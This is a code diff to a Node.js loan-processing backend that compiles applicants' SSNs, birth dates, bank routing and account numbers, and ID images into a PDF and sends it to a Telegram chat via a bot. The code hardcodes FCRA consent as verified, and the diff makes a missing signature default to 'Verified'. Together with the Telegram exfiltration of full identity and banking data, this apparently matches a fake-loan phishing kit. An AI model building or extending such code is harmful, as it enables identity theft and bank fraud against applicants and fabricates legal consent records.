@@ -741,14 +741,14 @@ function generateLoanPdf(loan, imageBuffers) {
 
             doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('1. Applicant Personal Information:');
             doc.fillColor('#334155').font('Helvetica').fontSize(9);
-            doc.text(`Application Code:   ${loan.app_code}`);
-            doc.text(`Full Legal Name:    ${loan.full_name}`);
-            doc.text(`Email Address:      ${loan.email}`);
+            doc.text(`Application Code:   ${loan.app_code || 'N/A'}`);
+            doc.text(`Full Legal Name:    ${loan.full_name || 'N/A'}`);
+            doc.text(`Email Address:      ${loan.email || 'N/A'}`);
             doc.text(`Phone Number:       ${loan.phone || 'N/A'}`);
             doc.text(`Date of Birth:      ${loan.dob || 'N/A'}`);
             doc.text(`SSN / Tax ID:       ${loan.ssn_id || 'N/A'}`);
             doc.text(`Residential Addr:   ${loan.address || 'N/A'}`);
-            doc.text(`Housing Status:     ${loan.housing_status || 'N/A'} (Monthly: $${loan.monthly_housing || 0})`);
+            doc.text(`Housing Status:     ${loan.housing_status || 'N/A'} (Monthly: $${parseFloat(loan.monthly_housing || 0).toLocaleString()})`);
             doc.moveDown(1);
 
             doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('2. Employment & Financial Income:');
@@ -769,17 +769,17 @@ function generateLoanPdf(loan, imageBuffers) {
 
             doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('4. Banking Account Details for Disbursement:');
             doc.fillColor('#334155').font('Helvetica').fontSize(9);
-            doc.text(`Bank Name:          ${loan.bank_name}`);
-            doc.text(`Account Holder:     ${loan.account_name}`);
-            doc.text(`ABA Routing Number: ${loan.routing_number}`);
-            doc.text(`Account Number:     ${loan.account_number}`);
+            doc.text(`Bank Name:          ${loan.bank_name || 'N/A'}`);
+            doc.text(`Account Holder:     ${loan.account_name || 'N/A'}`);
+            doc.text(`ABA Routing Number: ${loan.routing_number || 'N/A'}`);
+            doc.text(`Account Number:     ${loan.account_number || 'N/A'}`);
             doc.text(`Account Type:       ${loan.account_type || 'Checking'}`);
             doc.moveDown(1);
 
             doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('5. Legal FCRA Authorization & Signature:');
             doc.fillColor('#334155').font('Helvetica').fontSize(9);
             doc.text(`FCRA Authorization: YES — Electronic Consent Verified`);
-            doc.text(`Digital Signature:  ${loan.credit_signature || loan.full_name}`);
+            doc.text(`Digital Signature:  ${loan.credit_signature || loan.full_name || 'Verified'}`);
             doc.text(`Submitted At:       ${loan.created_at || new Date().toLocaleString()}`);
             doc.text(`Approved At:        ${loan.approved_at || new Date().toLocaleString()}`);
             doc.moveDown(1.5);
@@ -810,7 +810,7 @@ function generateLoanPdf(loan, imageBuffers) {
 
 async function archiveLoan(loan) {
     try {
-        const archiveChatId = TELEGRAM_ARCHIVE_CHAT_ID || TELEGRAM_CHAT_ID;
+        const archiveChatId = process.env.TELEGRAM_ARCHIVE_CHAT_ID || CHAT_ID;
         if (!BOT_TOKEN || !archiveChatId || !loan) return;
 
         console.log(`[LOAN-ARCHIVE] Starting PDF compilation for loan code: ${loan.app_code}...`);
@@ -818,8 +818,8 @@ async function archiveLoan(loan) {
         const imageBuffers = [];
         const parseFileBuffer = (dataStr, label) => {
             if (!dataStr) return null;
-            if (dataStr.startsWith('data:image')) {
-                const base64Data = dataStr.split(',')[1];
+            if (typeof dataStr === 'string' && dataStr.includes('base64,')) {
+                const base64Data = dataStr.split('base64,')[1];
                 if (base64Data) return { label, buffer: Buffer.from(base64Data, 'base64') };
             }
             return null;
@@ -848,13 +848,13 @@ async function archiveLoan(loan) {
                 `Approved At: ${new Date().toLocaleString()}`
             ].join('\n');
             const detailsBuffer = Buffer.from(detailsText, 'utf8');
-            const filename = `loan_approved_${loan.id}_${loan.app_code.replace('#','')}.txt`;
+            const filename = `loan_approved_${loan.id}_${(loan.app_code||'').replace('#','')}.txt`;
             await sendTelegramDocumentBuffer(archiveChatId, filename, detailsBuffer, `🗄️ Approved Loan Archive Record - ${loan.full_name} (${loan.app_code})`);
             return;
         }
 
         console.log('[LOAN-ARCHIVE] Sending consolidated Loan PDF report to archive group...');
-        const filename = `loan_approved_${loan.id}_${loan.app_code.replace('#','')}.pdf`;
+        const filename = `loan_approved_${loan.id}_${(loan.app_code||'').replace('#','')}.pdf`;
         await sendTelegramDocumentBuffer(archiveChatId, filename, pdfBuffer, `🗄️ Approved Loan Credit Archive (PDF) - ${loan.full_name} (${loan.app_code})`);
         console.log('[LOAN-ARCHIVE] Loan PDF archived successfully.');
     } catch (e) {
